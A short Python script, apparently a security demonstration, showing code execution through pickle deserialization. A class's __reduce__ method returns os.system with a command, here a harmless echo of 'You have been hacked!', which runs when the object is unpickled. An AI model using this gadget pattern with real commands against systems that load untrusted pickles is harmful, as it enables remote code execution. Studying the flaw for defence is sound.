import pickle
import os

class VulnerableClass:
    def __reduce__(self):
        return (os.system, ('echo "You have been hacked!"',))

def serialize_and_deserialize(vuln_obj):
    serialized = pickle.dumps(vuln_obj)
    deserialized = pickle.loads(serialized)
    return deserialized

vuln_obj = VulnerableClass()
deserialized_obj = serialize_and_deserialize(vuln_obj)
